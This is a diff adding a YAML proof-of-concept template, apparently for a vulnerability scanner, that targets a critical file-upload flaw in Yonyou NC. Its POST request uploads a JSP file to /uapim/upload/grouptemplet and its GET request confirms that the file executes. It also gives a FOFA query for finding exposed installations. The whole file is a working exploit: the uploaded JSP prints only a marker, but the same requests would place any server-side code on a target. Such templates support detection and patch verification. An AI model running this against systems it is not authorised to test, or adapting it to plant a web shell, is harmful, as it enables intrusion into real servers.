@@ -1,0 +1,41 @@
+id: poc-yaml-yongyou-grouptemplet-fileupload
+info:
+  name: 用友nc grouptemplet 文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  random_content: random_str(12)
+  random_name: random_str(8)
+  random_id: random_int(1,100)
+requests:
+- method: POST
+  path: /uapim/upload/grouptemplet?groupid={{.random_id}}&fileType=jsp
+  headers:
+    Content-type: multipart/form-data; boundary=----------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7
+  data: '------------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7
+
+    Content-Disposition: form-data; name="upload"; filename="{{.random_name}}.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    <%out.println("{{.random_content}}");%>
+
+    ------------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7--'
+  expression: 'status_code == 200 &&
+
+    contains(headers,"error")
+
+    '
+- method: GET
+  path: /uapim/static/pages/{{.random_id}}/head.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,random_content)
+
+    '
+transport: http
